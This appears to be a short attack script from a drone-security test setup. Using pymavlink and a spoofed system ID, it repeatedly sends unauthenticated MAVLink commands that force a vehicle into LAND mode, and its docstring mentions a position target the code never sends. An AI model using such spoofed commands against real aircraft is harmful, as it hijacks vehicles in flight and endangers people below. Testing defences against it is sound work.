"""Hostile uplink from a rogue sysid (66): force LAND (DO_SET_MODE) and a position target."""
import time

from pymavlink import mavutil

a = mavutil.mavlink_connection("tcp:127.0.0.1:5801", source_system=66, source_component=190)
time.sleep(1)
for _ in range(5):
    a.mav.command_long_send(1, 1, 176, 0, 1, 9, 0, 0, 0, 0, 0)       # DO_SET_MODE custom mode 9 = LAND
    a.mav.set_mode_send(1, 1, 9)                                        # legacy SET_MODE LAND
    time.sleep(0.5)
print("attack sent", flush=True)
